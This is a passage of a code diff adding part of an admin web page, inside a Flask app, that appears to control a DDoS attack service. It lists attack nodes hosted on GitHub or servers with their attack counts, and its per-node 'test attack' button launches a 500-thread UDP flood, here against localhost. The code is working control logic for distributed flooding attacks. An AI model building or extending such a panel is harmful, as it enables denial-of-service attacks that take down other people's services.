+            const statusColor = node.status === 'active' ? 'status-success' : (node.status === 'no_binary' ? 'status-running' : 'status-failed');
+            html += `<div class="col-md-4"><div class="bg-dark p-3 rounded-3">
+                <div class="d-flex justify-content-between align-items-center mb-2">
+                    <strong>${node.name}</strong><span class="status-badge ${statusColor}">${node.status}</span>
+                </div>
+                <p class="small mb-2"><i class="fas fa-${node.type === 'github' ? 'code-branch' : 'server'}"></i> ${node.type.toUpperCase()} | Attacks: ${node.attack_count}</p>
+                <button class="btn btn-sm btn-outline-info w-100" onclick="testSingleNode('${node.id}', '${node.name}')"><i class="fas fa-flask"></i> Test This Node</button>
+            </div></div>`;
+        });
+        html += '</div>';
+        container.innerHTML = html;
+    } catch(e) {
+        console.error(e);
+    }
+}
+
+// Test a single node
+async function testSingleNode(nodeId, nodeName) {
+    if (!confirm(`Test attack on ${nodeName}? Use default test target (127.0.0.1:443, 10s, UDP, 500 threads).`)) return;
+    
+    // Show loading
+    const btn = event.target;
+    const originalText = btn.innerHTML;
+    btn.innerHTML = '<span class="spinner-border spinner-border-sm"></span> Testing...';
+    btn.disabled = true;
+    
+    try {
+        // Quick test with predefined safe parameters
+        const formData = new FormData();
+        formData.append('target', '127.0.0.1');
+        formData.append('port', '443');
+        formData.append('duration', '5');
+        formData.append('method', 'udp');
+        formData.append('threads', '500');
+        formData.append('single_node', nodeId);
+        
+        const res = await fetch('/admin/test-attack/single', { method: 'POST', body: formData });
+        const data = await res.json();
+        alert(`Test on ${nodeName}: ${data.status} - ${data.message}`);
+    } catch(e) {
+        alert('Test failed');
+    } finally {
+        btn.innerHTML = originalText;
+        btn.disabled = false;
+    }
+}
+
+// Load nodes on page load
+document.addEventListener('DOMContentLoaded', loadNodes);
+</script>
+</body></html>
 '''
-  
 # ==================== RUN ====================
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080)), debug=False)
